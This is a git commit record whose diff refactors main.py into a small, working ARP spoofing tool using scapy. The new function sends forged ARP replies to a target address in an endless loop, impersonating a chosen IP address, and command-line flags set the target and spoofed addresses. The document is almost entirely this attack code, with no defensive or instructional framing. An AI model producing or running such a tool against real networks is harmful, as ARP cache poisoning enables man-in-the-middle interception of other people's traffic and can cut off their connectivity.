86d3c77885723e10272b34571b4ccc372fc88ddb
PolymorFox <drmagnet1234@protonmail.com>
2025-07-15 15:21:40 +0000

    Refactor main.py: add argparse for target and spoof addresses, encapsulate ARP spoof logic in function

--- main.py
+++ main.py
@@ -1,14 +1,23 @@
-from spoofer import spoof
 import argparse
+from scapy.all import *
+import time
+
+def spoof(target_address: str, spoof_address: str):
+ 
+    arp_poison_ping = ARP(op=2,pdst=target_address,psrc=spoof_address)
+
+    print(f"Spoofing {target_address} as {spoof_address}")
+    while True:
+        send(arp_poison_ping,verbose=False)
+        time.sleep(2)
+
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-t",type=str)
-parser.add_argument("-s",type=str)
-parser.add_argument("-n",type=int)
+parser.add_argument("--target_address",type=str)
+parser.add_argument("--spoof_address",type=str)
 args = parser.parse_args()
 
-target_address = args.t
-spoofed_address = args.s
-ping_limit = args.n
+target_address = args.target_address
+spoof_address = args.spoof_address
 
-spoof(target_address,spoofed_address,ping_limit)
+spoof(target_address,spoof_address)
